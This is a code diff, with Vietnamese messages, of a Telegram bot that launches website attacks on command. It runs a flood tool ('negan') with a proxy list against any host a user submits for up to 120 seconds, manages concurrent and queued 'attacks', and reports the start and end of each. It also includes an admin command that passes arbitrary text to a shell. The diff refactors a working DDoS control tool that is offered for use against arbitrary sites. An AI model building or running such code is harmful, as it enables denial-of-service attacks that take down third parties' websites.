@@ -5,57 +5,61 @@ const adminId = 1243471275;
 const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
 const maxTime = 120;
 const maxConcurrent = 3;
-const maxSlot = 1;
 
 const bot = new TelegramBot(token, { polling: true });
 const processes = { users: new Map(), attacks: new Map(), queue: [] };
 
 // ==================== CORE FUNCTIONS ====================
 const sendMsg = (chatId, text, buttons) => {
-  const options = {
-    parse_mode: 'HTML',
-    reply_markup: buttons ? { inline_keyboard: buttons } : undefined
-  };
+  const options = { parse_mode: 'HTML', ...(buttons && { reply_markup: { inline_keyboard: buttons } }) };
   bot.sendMessage(chatId, text, options);
 };
 
 const cleanup = (pid, uid) => {
   processes.attacks.delete(pid);
   processes.users.delete(uid);
+  processQueue();
 };
 
 const processQueue = () => {
   if (processes.queue.length === 0 || processes.attacks.size >= maxConcurrent) return;
-  const task = processes.queue.shift();
-  sendMsg(task.chatId, '⚡ Đang xử lý lệnh từ hàng đợi...');
-  execute(task.chatId, task.host, task.time, task.user, task.uid);
+  const { chatId, host, time, user, uid } = processes.queue.shift();
+  execute(chatId, host, time, user, uid);
 };
 
 const execute = (chatId, host, time, user, uid) => {
   const pid = Date.now() % 1e6;
-  const start = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+  const startTime = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
 
-  const message = `🚀 Successfully 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${user}\nMaxslot: ${maxSlot}\nConcurrentAttacks: ${processes.attacks.size + 1}\nStart: ${start}`;
+  const message = JSON.stringify({
+    Status: "🚀 Successfully 🚀",
+    Caller: user,
+    "PID Attack": pid,
+    Website: host,
+    Time: `${time} Giây`,
+    Maxslot: 1,
+    ConcurrentAttacks: processes.attacks.size + 1,
+    StartTime: startTime,
+    CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
+    HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
+  }, null, 2);
+
   const buttons = [
     [{ text: '🔍 Check Host', url: `https://check-host.net/check-http?host=${host}` }],
     [{ text: '📡 Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
   ];
 
-  sendMsg(chatId, message, buttons);
+  sendMsg(chatId, `<pre>${message}</pre>`, buttons);
 
   const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
   processes.attacks.set(pid, { uid, start: Date.now() });
   processes.users.set(uid, { pid, start: Date.now(), time });
 
   child
-    .on('error', e => {
-      sendMsg(chatId, `❌ Lỗi hệ thống: ${e.message}`);
-      cleanup(pid, uid);
-    })
+    .on('error', e => sendMsg(chatId, `❌ Lỗi hệ thống: <code>${e.message}</code>`))
     .on('exit', () => {
       sendMsg(chatId, `🛸 END ATTACK\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${user}\nEnd Attack: ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`);
       cleanup(pid, uid);
-      processQueue();
     });
 };
 
@@ -74,8 +78,7 @@ bot.on('message', msg => {
     if (!host || isNaN(t)) return sendMsg(cid, '⚠️ Sai cú pháp! Ví dụ: https://example.com 60');
     if (t > maxTime) return sendMsg(cid, `⏳ Tối đa ${maxTime} giây!`);
 
-    const userAttacks = [...processes.users.values()].filter(x => x.uid === uid).length;
-    if (userAttacks >= maxSlot) return sendMsg(cid, `⛔ Bạn chỉ được dùng ${maxSlot} slot cùng lúc!`);
+    if (processes.users.has(uid)) return sendMsg(cid, '⛔ Bạn đang có một tiến trình chạy, vui lòng đợi!');
 
     if (processes.attacks.size >= maxConcurrent) {
       processes.queue.push({ chatId: cid, host, time: t, user, uid });
@@ -92,10 +95,7 @@ bot.on('message', msg => {
     if (!cmd) return sendMsg(cid, '⚠️ Vui lòng nhập lệnh!');
 
     exec(cmd, (err, stdout, stderr) => {
-      let result = '';
-      if (err) result = `❌ Lỗi:\n<code>${err.message}</code>`;
-      else if (stderr) result = `⚠️ Cảnh báo:\n<code>${stderr}</code>`;
-      else result = `✅ Kết quả:\n<code>${stdout || 'Không có output'}</code>`;
+      const result = err ? `❌ Lỗi:\n<code>${err.message}</code>` : stderr ? `⚠️ Cảnh báo:\n<code>${stderr}</code>` : `✅ Kết quả:\n<code>${stdout || 'Không có output'}</code>`;
       sendMsg(cid, result);
     });
     return;
